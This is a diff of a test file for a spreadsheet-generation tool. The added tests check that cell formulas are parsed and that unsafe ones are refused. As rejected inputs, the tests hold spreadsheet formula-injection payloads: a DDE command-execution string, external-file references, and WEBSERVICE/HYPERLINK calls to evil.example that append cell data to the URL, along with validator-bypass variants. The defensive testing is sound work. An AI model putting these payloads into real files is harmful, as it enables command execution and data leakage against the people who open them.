@@ -8,7 +8,7 @@ import * as XLSX from 'xlsx'
 import { extractText, officeWorkerScript } from '../../server/src/files/extract'
 import { makeHandler } from '../../server/src/mcp/protocol'
 import { isolation, runIsolated, sandboxProfile } from '../../server/src/tools/isolate'
-import { cellValue, markdownTables, parseCsv } from '../../server/src/tools/make-file'
+import { cellValue, formulaOf, markdownTables, parseCsv } from '../../server/src/tools/make-file'
 import { toolRegistry } from '../../server/src/tools/registry'
 import { which } from '../../server/src/config'
 import { makeCApp, type CApp, type Person } from '../lib/c-app'
@@ -133,6 +133,119 @@ describe('make_file', () => {
     expect(parseCsv('a,"b ""q""\nc",d\r\n1,2,3')).toEqual([['a', 'b "q"\nc', 'd'], ['1', '2', '3']])
     expect(markdownTables('| a | b |\n| --- | :-: |\n| 1 | x \\| y |')).toEqual([{ title: undefined, rows: [['a', 'b'], ['1', 'x | y']] }])
     expect([cellValue('1,234.5'), cellValue('010-1234'), cellValue('+82'), cellValue('12345678901234567')]).toEqual([1234.5, '010-1234', '+82', '12345678901234567'])
+  })
+  test('xlsx: "=" cells become formulas (R2-GEN-02), "\'=" stays text, formulas that reach outside are refused', async () => {
+    const md = '## 지역별\n\n| 지역 | Q1 | Q2 | Q3 | Q4 | 합계 |\n|---|---|---|---|---|---|\n| 서울 | 10 | 20 | 30 | 40 | =SUM(B2:E2) |\n| 대전 | 2 | 4 | 6 | 8 | =sum(B3:E3) |\n| 합계 | =SUM(B2:B3) | | | | =SUM(F2:F3) |\n| note | \'=SUM(A1) | | | | |\n\n' +
+      '## 비율\n\n| 지역 | 비율 |\n|---|---|\n| 서울 | =지역별!F2/지역별!F4 |\n| 대전 | =IFERROR(\'지역별\'!F3/\'지역별\'!F4, 0) |\n| x | =XLOOKUP("서울",지역별!A2:A3,지역별!F2:F3) |\n'
+    const r = await call('alice', null, 'make_file', { content: md, format: 'xlsx', output: 'users/alice/out/f.xlsx' })
+    expect(r.isError, r.text).toBe(false)
+    expect(r.text).toContain('7 formula cells')
+    const dir = fs.mkdtempSync(path.join(A.data, 'unzip-'))
+    Bun.spawnSync(['unzip', '-o', '-q', path.join(A.team, 'users/alice/out/f.xlsx'), '-d', dir])
+    const sheet1 = fs.readFileSync(path.join(dir, 'xl/worksheets/sheet1.xml'), 'utf8')
+    const sheet2 = fs.readFileSync(path.join(dir, 'xl/worksheets/sheet2.xml'), 'utf8')
+    expect(sheet1).toContain('<f>SUM(B2:E2)</f>')
+    expect(sheet1).toContain('<f>SUM(B3:E3)</f>') // function names are written in upper case
+    expect(sheet1).toContain('<f>SUM(F2:F3)</f>')
+    expect(sheet2).toContain('<f>지역별!F2/지역별!F4</f>')
+    expect(sheet2).toContain('<f>_xlfn.XLOOKUP(&quot;서울&quot;,지역별!A2:A3,지역별!F2:F3)</f>')
+    expect(fs.readFileSync(path.join(dir, 'xl/workbook.xml'), 'utf8')).toMatch(/fullCalcOnLoad="1"/)
+    const wb = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/f.xlsx')))
+    expect(wb.Sheets['지역별']!.B5.v).toBe('=SUM(A1)') // the apostrophe escape: plain text, no formula
+    expect(wb.Sheets['지역별']!.B5.f).toBeUndefined()
+    // read / grep show a formula cell as its formula, not as a blank
+    const text = await extractText('f.xlsx', fs.readFileSync(path.join(A.team, 'users/alice/out/f.xlsx')), { pandoc: null, pdftotext: null, ocr: null } as any)
+    expect(text).toContain('서울\t10\t20\t30\t40\t=SUM(B2:E2)')
+    expect(text).toContain('=XLOOKUP(')
+
+    for (const [bad, why] of [
+      ["=cmd|'/c calc'!A1", 'DDE'], ['=SUM([1]Sheet1!A1)', 'other files'], ['=[1]Sheet1!A1+1', 'other files'], ["='C:\\x\\[b.xlsx]S'!A1", 'other files'],
+      ['=HYPERLINK("https://example.com","x")', 'HYPERLINK'], ['=WEBSERVICE("https://example.com")', 'WEBSERVICE'], ['=SUM(INDIRECT("A1"))', 'INDIRECT'],
+    ]) {
+      const e = await call('alice', null, 'make_file', { content: `a,b\n1,"${bad!.replace(/"/g, '""')}"\n`, format: 'xlsx', output: 'users/alice/out/bad.xlsx' })
+      expect(e.isError, bad).toBe(true)
+      expect(e.text, bad).toContain(why!)
+      expect(e.text).toContain('cell B2')
+      expect(fs.existsSync(path.join(A.team, 'users/alice/out/bad.xlsx'))).toBe(false)
+    }
+    // text inside "quotes" is not checked as code; an unclosed quote is refused
+    expect(formulaOf('IF(A1="a|b[c]","HYPERLINK(",1)')).toEqual({ formula: 'IF(A1="a|b[c]","HYPERLINK(",1)' })
+    expect(formulaOf('"abc')).toHaveProperty('error')
+    expect(formulaOf('SUM(B2')).toEqual({ error: 'the parentheses of the formula do not match' })
+    expect(formulaOf('== note ==')).toHaveProperty('error')
+    expect(formulaOf("'S (1)'!A1+SUM(A1:A2)")).toEqual({ formula: "'S (1)'!A1+SUM(A1:A2)" })
+    expect([cellValue('=SUM(A1:A2)'), cellValue("'=x"), cellValue('='), cellValue("'quoted'")]).toEqual([{ formula: 'SUM(A1:A2)' }, '=x', '=', "'quoted'"])
+  })
+  test('xlsx formulas: quotes in quoted sheet names do not hide blocked parts (review bypass)', async () => {
+    // a '"' inside a 'quoted sheet name' must not open a string literal that hides the code after it
+    const bypass = [
+      `N("")&'x"'!A1&WEBSERVICE("http://evil.example/?"&A1)&'y"'!A1`,
+      `N("")&'x"'!A1&HYPERLINK("http://evil.example/","x")&'y"'!A1`,
+      `N("")&'x"'!A1&cmd|'/c calc'!A1&'y"'!A1`,
+      `N("")&'x"'!A1&[1]S!A1&'y"'!A1`,
+      `N("")&'x"'!A1&'C:\\x\\b'!A1&'y"'!A1`,
+      `_xlws.WEBSERVICE("http://evil.example/")`,
+      `_xludf.HYPERLINK("http://evil.example/")`,
+      `'a|b'!A1`,
+      `'[1]S'!A1`,
+      `'x"'!A1`,
+    ]
+    for (const f of bypass) expect(formulaOf(f), f).toHaveProperty('error')
+    for (const f of bypass.slice(0, 5)) {
+      const e = await call('alice', null, 'make_file', { content: `a,b\n1,"=${f.replace(/"/g, '""')}"\n`, format: 'xlsx', output: 'users/alice/out/bypass.xlsx' })
+      expect(e.isError, f).toBe(true)
+      expect(fs.existsSync(path.join(A.team, 'users/alice/out/bypass.xlsx'))).toBe(false)
+    }
+    // generated sheet names have no quote characters, and a formula that names a quoted sheet with '"' is refused
+    const md = '## x"\n\n| a |\n|---|\n| 1 |\n\n## y\'\n\n| a |\n|---|\n| 2 |\n'
+    const ok = await call('alice', null, 'make_file', { content: md, format: 'xlsx', output: 'users/alice/out/names.xlsx' })
+    expect(ok.isError, ok.text).toBe(false)
+    const names = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/names.xlsx'))).SheetNames
+    expect(names.some((n) => /["']/.test(n)), names.join(',')).toBe(false)
+    const bad = md + `\n## z\n\n| a |\n|---|\n| =N("")&'x"'!A1&WEBSERVICE("http://evil.example/")&'y"'!A1 |\n`
+    const e = await call('alice', null, 'make_file', { content: bad, format: 'xlsx', output: 'users/alice/out/names2.xlsx' })
+    expect(e.isError, e.text).toBe(true)
+    expect(fs.existsSync(path.join(A.team, 'users/alice/out/names2.xlsx'))).toBe(false)
+  })
+  test('xlsx: a cell is a formula only when an operand follows "="; other "=" text stays text', async () => {
+    for (const t of ['=> done', '= see note', '=-', '== note ==', "='hello'", '=see (note)', '=Total', '=?']) expect(cellValue(t), t).toBe(t)
+    expect(cellValue('=-A1')).toEqual({ formula: '-A1' })
+    expect(cellValue('=+SUM(A1:A2)')).toEqual({ formula: '+SUM(A1:A2)' })
+    expect(cellValue('=(A1+1)*2')).toEqual({ formula: '(A1+1)*2' })
+    expect(cellValue('="a"&B2')).toEqual({ formula: '"a"&B2' })
+    expect(cellValue('=12.5*2')).toEqual({ formula: '12.5*2' })
+    expect(cellValue('=$B$2+B:B')).toEqual({ formula: '$B$2+B:B' })
+    expect(cellValue('=지역별!F2')).toEqual({ formula: '지역별!F2' })
+    expect(cellValue("='S 1'!A1")).toEqual({ formula: "'S 1'!A1" })
+    expect(cellValue('=TRUE')).toEqual({ formula: 'TRUE' })
+    expect(cellValue('=A1+')).toHaveProperty('error')
+    const r = await call('alice', null, 'make_file', { content: 'a,b\n1,=> done\n2,= see note\n', format: 'xlsx', output: 'users/alice/out/text.xlsx' })
+    expect(r.isError, r.text).toBe(false)
+    const ws = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/text.xlsx'))).Sheets.Sheet1!
+    expect([ws.B2.v, ws.B2.f, ws.B3.v, ws.B3.f]).toEqual(['=> done', undefined, '= see note', undefined])
+  })
+  test('xlsx: a cell is a formula only when the whole formula parses (re-review)', async () => {
+    // text that starts like a formula but does not parse as a whole stays text
+    const text = ['=3 days', '= 5 stars', '=1 apple', '=2x', '=> done', '= see note', '=A1 total', '=SUM(A1) x', '=Total+1', '="a" "b"', '=3 days(']
+    for (const t of text) expect(cellValue(t), t).toBe(t)
+    expect(cellValue('=SUM(A1:A3)')).toEqual({ formula: 'SUM(A1:A3)' })
+    expect(cellValue('=A1*2')).toEqual({ formula: 'A1*2' })
+    expect(cellValue('=IF(A1>1,"y","n")')).toEqual({ formula: 'IF(A1>1,"y","n")' })
+    expect(cellValue("='Q1 data'!B2+1")).toEqual({ formula: "'Q1 data'!B2+1" })
+    expect(cellValue('=SUM($1:$3)+10%')).toEqual({ formula: 'SUM($1:$3)+10%' })
+    expect(cellValue('=IFERROR(1/0,#N/A)')).toEqual({ formula: 'IFERROR(1/0,#N/A)' })
+    expect(cellValue('=SUM({1,2;3,4})*1.5e2')).toEqual({ formula: 'SUM({1,2;3,4})*1.5e2' })
+    // the blocked-function and external-reference rules still refuse the cell, also when the rest does not parse
+    expect(cellValue('=1 apple&WEBSERVICE("http://evil.example/")')).toHaveProperty('error')
+    expect(cellValue('=webservice ("http://evil.example/")')).toBe('=webservice ("http://evil.example/")')
+    expect(cellValue('=SUM(1 x,webservice ("http://evil.example/"))')).toHaveProperty('error')
+    expect(cellValue('=[1]S!A1 x')).toHaveProperty('error')
+    const csv = 'a,b\n' + text.slice(0, 4).map((t, i) => `${i},${t}`).join('\n') + '\n9,=SUM(A2:A5)\n'
+    const r = await call('alice', null, 'make_file', { content: csv, format: 'xlsx', output: 'users/alice/out/parse.xlsx' })
+    expect(r.isError, r.text).toBe(false)
+    const ws = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/parse.xlsx')), { sheetStubs: true }).Sheets.Sheet1!
+    expect([2, 3, 4, 5].map((n) => [ws[`B${n}`].v, ws[`B${n}`].f])).toEqual(text.slice(0, 4).map((t) => [t, undefined]))
+    expect(ws.B6?.f).toBe('SUM(A2:A5)')
   })
   test('source file and team images (only readable ones) work; an existing file gets a conflict copy unless read this turn', async () => {
     const png = path.join(A.data, 'p.png')
